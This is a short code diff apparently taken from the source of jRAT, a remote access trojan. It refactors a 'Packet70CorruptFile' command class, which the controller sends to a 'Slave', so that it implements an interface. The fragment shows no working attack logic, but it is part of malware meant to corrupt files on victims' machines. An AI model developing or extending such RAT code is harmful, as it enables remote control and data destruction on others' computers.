@@ -3,7 +3,7 @@ package jrat.controller.packets.outgoing;
 import jrat.controller.Slave;
 
 
-public class Packet70CorruptFile extends AbstractOutgoingPacket {
+public class Packet70CorruptFile implements OutgoingPacket {
 
 	private String file;
 
